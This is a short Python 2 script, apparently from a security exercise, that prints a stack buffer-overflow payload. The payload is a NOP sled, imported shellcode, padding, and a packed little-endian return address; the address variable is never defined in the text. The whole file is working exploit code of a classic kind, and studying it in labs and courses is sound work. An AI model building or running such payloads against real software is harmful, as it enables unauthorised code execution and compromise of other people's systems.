from shellcode import shellcode
from struct import pack

print "\x90"*(1024 - len(shellcode)) + shellcode + "\x90"*12 + pack("<I", address)